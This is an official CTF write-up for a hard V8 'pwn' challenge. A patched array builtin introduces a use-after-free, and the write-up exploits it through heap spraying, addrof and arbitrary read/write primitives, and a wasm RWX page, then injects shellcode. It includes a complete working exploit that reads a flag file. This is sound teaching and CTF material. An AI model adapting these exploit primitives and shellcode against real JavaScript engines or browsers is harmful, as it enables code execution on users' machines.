![](../../../../../assets/logo_htb.png)



<img src="../../../../../assets/htb.png" style="margin-left: 20px; zoom: 80%;" align=left />    	<font size="10">Pyrrhus</font>

​		16th<sup>th</sup> May 2024

​		Prepared By: ryaagard

​		Challenge Author(s): ryaagard

​		Difficulty: <font color=red>Hard</font>

​		Classification: Official

 



# Synopsis

Pyrrhus is a Hard pwn challenge that involves

# Description

In your question for materials and information, you finds yourselves facing an unexpected challenge in a city governed by automated robots. Programmmed to shoot unregistered residents on sight, these robots are a stark reminder of how humanity's greed pushed too far. Undaunted, you break into the central C2 server and try to knock it out.

## Skills Required

- 

## Skills Learned

- 

# Enumeration

This challenge contains a patched d8 binary and we can see what exactly has been changed from the diff provided

```diff
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -653,6 +653,25 @@ BUILTIN(ArrayUnshift) {
   return Smi::FromInt(new_length);
 }
 
+BUILTIN(ArrayNumerify) {
+  HandleScope scope(isolate);
+
+  Handle<JSArray> array = Handle<JSArray>::cast(args.receiver());
+  int arr_len = static_cast<int>(array->elements()->length());
+  Tagged<FixedArray> elems = FixedArray::cast(array->elements());
+
+  for (int i = 0; i < arr_len; i++) {
+    Handle<Object> curr_elem = Handle<Object>(elems->get(i), isolate);
+
+    if (IsHole(*curr_elem) || IsNaN(*curr_elem)) continue;
+    if (!IsNumber(*curr_elem) && !Object::ToNumber(isolate, curr_elem).ToHandle(&curr_elem)) continue;
+
+    elems->set(i, Smi::cast(*curr_elem));
+  }
+
+  return *args.receiver();
+}
```

The most important change is shown above; a new array builtin has been introduced. The idea behind is that we can convert non-numeric elements of the array to a numeric value, if possible (ie. `["123", 1].numerify()` returns `[123, 1]`).

The high level overview of what the function does is as follows:

- Store the length of the target array into `arr_len` which will later be used as a upper bound for the loop
- Loop over each element
  - Skip the element if its a hole
  - Skip the element if its not possible to convert to a number
- Replace the element with its small integer representation

The bug here is that `Object::ToNumber` can call javascript callbacks if the element has one, meaning that if the callback shrinks/frees the backing buffer, it will do a out-of-bounds/use-after-free write of the callback return value.

```js
let a = new Array(10);

let evil = { [Symbol.toPrimitive]() {
    a = undefined;
    return 0xdeadbeef;
}}
a[a.length - 1] = evil;
a.numerify();
```

The code shown above will write the value `0xdeadbeef` at the last index of the array `a` after it has been freed, effectively performing a use-after-free.

# Exploitation

With the UAF we can target backing buffer capacity field to extend it outside of its actual bounds. To do that we will have to write a callback that, first, frees the victim array backing buffer, then sprays the heap with a bunch of arrays and finally returns the value we want to write to the capacity field. In the exploit that looks like the following:

```js
let evil = { [Symbol.toPrimitive]() {
    a = undefined;
    for (let j = 0; j < SPRAY_COUNT; j++) {
        let arr = new Array(ARRAY_SIZE_TWO).fill(FILL_THING);
        arr[0] = j;
        sprayed.push(arr);
    }
    return 0x200;
}}
a[ARRAY_SIZE - 1] = evil;
a.numerify();
```

In the code snippet above the value of `ARRAY_SIZE_TWO` is 500, values lower than that didn't overlap with the freed victim backing buffer from our testing.

Because the sprayed arrays aren't aligned in memory the same way each spray round, we will have to loop this spray until we successfully overwrite the capacity field of one array. After each spray round we will have to loop through all arrays in `sprayed` array and see if its capacity field has been overwritten. We can do that by growing the `length` field and checking if the element at indexes above the previous maximum index are `undefined`; if they are `undefined` that means we have't overwritten the capacity field, otherwise it will leak the map and elements pointer.

With the capacity overwritten and grown outside of its bounds we have out-of-bounds read/write from the corrupted array. As the `elements` pointer points to the memory where the elements are stored, and is used when reading/writing new elements to the array, overwriting it we have arbitrary read and write primitive.

In the exploit, after finding the array with its backing buffer capacity overwritten, we find the array right above it too. This allows us to use the out-of-bounds read/write we currently have to change the `elements` pointer of the array just above it so the arbitrary read and write are reusable, if we changed the `elements` pointer of the array we corrupted we could not go back and change it again.

Even though we have control over `elements` pointer, the arbitrary read and write are both constrained to the current heap area we are at because of pointer compression. To get around this we can use ArrayBuffer, its `elements` pointer is not compressed which means that we can read and write to whatever memory address we want.

To get the addrof primitive, which will be useful later, we can set the prototype field of an array to the object we want to get the address of. This prototype field is at offset 0x10 from the start of the array's map, which means after we set the prototype field of the array we read its map pointer, then arbitrary read `map + 0x10` to get the address of the object we want. This looks like the following in the exploit:

```js
addrof(obj) {
    let proto = Object.getPrototypeOf(this.next);
    Object.setPrototypeOf(this.next, obj);
    let [next_map_ptr, ] = fto2i(this.oob_read(this.offset + 3 + this.offset));
    let [addr, ] = fto2i(this.arb_read(next_map_ptr + 16));
    Object.setPrototypeOf(this.next, proto);
    return addr;
}
```

In the exploit we make d8 create a `rwx` memory region by jit compiling a wasm function. This is already a well documented technique and in the exploit for this challenge looks like the following:

```js
var wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 7, 9, 1, 5, 115, 104, 101, 108, 108, 0, 0, 10, 4, 1, 2, 0, 11]);
var mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(mod);
var shell = wasm_instance.exports.shell;
for (var i = 0; i < 1024 * 8; i++)
    shell();
```

The idea is to leak the address of the `rwx` memory page and write shellcode to it with the arbitrary write we have by controlling the `elements` pointer of a ArrayBuffer. After doing that and calling the wasm function it will call the `rwx` page where we have written our shellcode.

To leak the address of `rwx` page we do the following:

```js
let [, wasm_trused_data] = fto2i(corrupted.arb_read(corrupted.addrof(wasm_instance) + 8));
let code_ptr = ftoi(corrupted.arb_read(wasm_trused_data + 0x30));
```

In the code above `code_ptr` has the value of the `rwx` memory page. After that we can just write our shellcode to it with the arbitrary write and call (in this case) `shell()` to make d8 jump to it.

## Final Exploit

```js
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
         f64_buf[0] = val;
         return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}
function itof(val) {
         u64_buf[0] = Number(val & 0xffffffffn);
         u64_buf[1] = Number(val >> 32n);
         return f64_buf[0];
}
function fto2i(val) {
    f64_buf[0] = val;
    return [u64_buf[0], u64_buf[1]]
}
function _2itof(v1, v2) {
    u64_buf[0] = v1;
    u64_buf[1] = v2;
    return f64_buf[0];
}
function i_to_smi(v) {
    return v << 1;
}
function smi_to_i(v) {
    v >> 1;
}

const FILL_THING = 1.1;
const ARRAY_SIZE = 168;
const ARRAY_SIZE_TWO = 500;
const MAIN_SPRAY_COUNT = 40;
const SPRAY_COUNT = 1024;

class OobArray {
    // Self-overlapping array and offset to the header of the JSArray
    // Next is the array directly after `OobArray`
    constructor(array, offset) {
        this.array = array;
        this.offset = offset;
    }
    get_map_ptr() {
        let [map, _] = fto2i(this.array[this.offset]);
        return map;
    }
    get_elements_ptr() {
        let [elts, _] = fto2i(this.array[this.offset + 1]);
        return elts;
    }
    oob_read(idx) {
        let len = this.array.length;
        let [elts, _] = fto2i(this.array[this.offset + 1]);
        this.array[this.offset + 1] = _2itof(elts, i_to_smi(idx + 1));
        let val = this.array[idx];
        this.array[this.offset + 1] = _2itof(elts, i_to_smi(len));
        return val;
    }
    oob_write(idx, value) {
        let len = this.array.length;
        let [elts, ] = fto2i(this.array[this.offset + 1]);
        this.array[this.offset + 1] = _2itof(elts, i_to_smi(idx + 1));
        this.array[idx] = value;
        this.array[this.offset + 1] = _2itof(elts, i_to_smi(len));
    }
    // read a qword as a float from a compressed pointer
    arb_read(ptr) {
        let [elts, len] = fto2i(this.oob_read(this.offset + 3 + this.offset + 1));
        this.oob_write(this.offset + 3 + this.offset + 1, _2itof(ptr - 8, len));
        let val = this.next[0];
        this.oob_write(this.offset + 3 + this.offset + 1, _2itof(elts, len));
        return val;
    }
    // write a qword as a float to a compressed pointer
    arb_write(ptr, val) {
        let [elts, len] = fto2i(this.oob_read(this.offset + 3 + this.offset + 1));
        this.oob_write(this.offset + 3 + this.offset + 1, _2itof(ptr - 8, len));
        this.next[0] = val;
        this.oob_write(this.offset + 3 + this.offset + 1, _2itof(elts, len));
    }
    addrof(obj) {
        let proto = Object.getPrototypeOf(this.next);
        Object.setPrototypeOf(this.next, obj);
        let [next_map_ptr, ] = fto2i(this.oob_read(this.offset + 3 + this.offset));
        let [addr, ] = fto2i(this.arb_read(next_map_ptr + 16));
        Object.setPrototypeOf(this.next, proto);
        return addr;
    }
}

class EvilBuffer {
    constructor(oob) {
        this.oob = oob;
        this.buf = new ArrayBuffer(0x10000);
    }
    // read a qword as a float from a real pointer
    arb_read(ptr) {
        let ab_addr = this.oob.addrof(this.buf);
        this.oob.arb_write(ab_addr + 0x24, itof(ptr));
        let view = new Float64Array(this.buf);
        return view[0];
    }
    // write a byte array to a real pointer
    arb_write(ptr, bytes) {
        let ab_addr = this.oob.addrof(this.buf);
        this.oob.arb_write(ab_addr + 0x24, itof(ptr));
        let view = new Uint8Array(this.buf);
        for (let i = 0; i < bytes.length; i++) {
            view[i] = bytes[i];
        }
    }
}

function do_overlap() {
    for (let i = 0; i < MAIN_SPRAY_COUNT; i++) {
        let sprayed = [];
        let a = new Array(ARRAY_SIZE);

        // Delete `a` and try to overwrite the `length` of the backing store
        // of one of our newly allocated arrays
        let evil = { [Symbol.toPrimitive]() {
            a = undefined;
            for (let j = 0; j < SPRAY_COUNT; j++) {
                let arr = new Array(ARRAY_SIZE_TWO).fill(FILL_THING);
                arr[0] = j;
                sprayed.push(arr);
            }
            return 0x200;
        }}
        a[ARRAY_SIZE - 1] = evil;
        a.numerify();

        for (let j = 0; j < sprayed.length; j++) {
            // Try and grow the length of the sprayed JSArray into our
            // fake over-large backing store
            let old_len = sprayed[j].length;
            sprayed[j].length = old_len + 4;
            let elts_length = sprayed[j][ARRAY_SIZE_TWO + 1];
            // The backing store of this array hasn't been expanded
            if (elts_length === undefined) continue;
            // Read out the elements pointer and length smi
            let [, length] = fto2i(elts_length);
            // We've overlapped with our own JSArray header
            if (length == i_to_smi(sprayed[j].length)) {
                let oob = new OobArray(sprayed[j], ARRAY_SIZE_TWO);
                let next = oob.oob_read(ARRAY_SIZE_TWO + 3);
                oob.next = sprayed[next];
                return oob;
            }
        }
    }
    return undefined;
}

let corrupted;
console.log("heap spraying, waiting for overlap...");
while (!corrupted) corrupted = do_overlap();

console.log("got corrupted");

var wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 7, 9, 1, 5, 115, 104, 101, 108, 108, 0, 0, 10, 4, 1, 2, 0, 11]);
var mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(mod);
var shell = wasm_instance.exports.shell;
for (var i = 0; i < 1024 * 8; i++) shell();
let [, wasm_trused_data] = fto2i(corrupted.arb_read(corrupted.addrof(wasm_instance) + 8));
let code_ptr = ftoi(corrupted.arb_read(wasm_trused_data + 0x30));

console.log("code_ptr: 0x" + code_ptr.toString(16));

// sendfile(1, open("/app/flag.txt"), ...)
let shellcode = [0x48, 0xb8, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x50, 0x48, 0xb8, 0x66, 0x2f, 0x75, 0x79, 0x75, 0x1, 0x1, 0x1, 0x48, 0x31, 0x4, 0x24, 0x48, 0xb8, 0x2f, 0x61, 0x70, 0x70, 0x2f, 0x66, 0x6c, 0x61, 0x50, 0x6a, 0x2, 0x58, 0x48, 0x89, 0xe7, 0x31, 0xf6, 0x99, 0xf, 0x5, 0x41, 0xba, 0xff, 0xff, 0xff, 0x7f, 0x48, 0x89, 0xc6, 0x6a, 0x28, 0x58, 0x6a, 0x1, 0x5f, 0x99, 0xf, 0x5];

let eb = new EvilBuffer(corrupted);
eb.arb_write(code_ptr, shellcode);
shell();
```